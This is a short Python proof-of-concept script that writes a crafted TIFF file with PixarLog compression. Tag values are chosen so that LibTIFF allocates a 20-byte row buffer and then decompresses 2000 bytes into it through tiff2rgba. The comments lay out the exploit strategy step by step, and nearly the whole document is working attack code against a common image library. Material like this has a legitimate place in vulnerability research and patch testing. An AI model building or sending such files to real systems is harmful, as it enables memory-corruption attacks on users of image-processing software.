import struct
import zlib
import os

def build_poc():
    header = b"II\x2a\x00\x08\x00\x00\x00"
    
    # Massive payload to ensure overflow
    # We need enough data to definitely exceed the 1-row buffer
    raw_uncompressed_attack = b"A" * 2000
    zlib_payload = zlib.compress(raw_uncompressed_attack)

    # EXPLOIT STRATEGY for 64-bit:
    # 1. Set RowsPerStrip = 1. 
    #    LibTIFF allocations: tbuf_size = Width(10) * RowsPerStrip(1) * Samples(1) * 2 = 20 bytes.
    # 2. Set ImageLength = 100.
    # 3. provide only ONE strip.
    # 4. When tiff2rgba reads the image, it sees it needs to decompress rows into tbuf.
    #    The 'occ' value for the first strip will be calculated. 
    #    In many LibTIFF versions, if the strip count is wrong, it might try to decompress 
    #    the available data into the buffer anyway.
    
    payload_offset = 160 

    # Tags MUST be sorted by ID
    entries = [
        (256, 3, 1, 10),               # ImageWidth: 10
        (257, 3, 1, 100),              # ImageLength: 100
        (258, 3, 1, 8),                # BitsPerSample: 8
        (259, 3, 1, 32909),            # Compression: PIXARLOG (0x808D)
        (262, 3, 1, 1),                # Photometric: BlackIsZero
        (273, 4, 1, payload_offset),   # StripOffsets: Pointer to zlib data
        (277, 3, 1, 1),                # SamplesPerPixel: 1
        (278, 4, 1, 1),                # RowsPerStrip: 1 (This forces malloc(20))
        (279, 4, 1, len(zlib_payload)) # StripByteCounts
    ]
    
    entries.sort()

    ifd = struct.pack("<H", len(entries))
    for tag, dtype, count, val in entries:
        ifd += struct.pack("<HHII", tag, dtype, count, val)
    ifd += struct.pack("<I", 0)

    # Padding to reach payload_offset
    padding = b"\x00" * (payload_offset - (len(header) + len(ifd)))

    return header + ifd + padding + zlib_payload

if __name__ == "__main__":
    with open("poc_64bit.tiff", "wb") as f:
        f.write(build_poc())
    print("Created poc_64bit.tiff")
